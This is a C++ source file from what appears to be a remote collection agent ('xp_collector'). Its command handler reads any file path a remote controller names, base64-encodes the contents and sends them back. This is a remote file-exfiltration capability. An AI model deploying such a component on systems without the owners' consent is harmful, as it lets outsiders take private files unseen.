#include "GetFileHandler.h"

#include <base64.hpp>

#include "Commands/GetFileCommand.h"
#include "Products/GetFileProduct.h"
#include "Protocol/ReturnProductRequest.h"
#include "Windows/WinUtils.h"

xp_collector::GetFileHandler::GetFileHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<xp_collector::IRequest> xp_collector::GetFileHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	const auto get_file_command = std::static_pointer_cast<GetFileCommand>(command);
	auto contents = windows::read_file(get_file_command->get_path());
	auto encoded = base64::to_base64(std::move(contents));
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<GetFileProduct>(command->get_command_id(), CommandType::GetFile, get_file_command->get_path(),
		                                 std::move(encoded))
	);
}
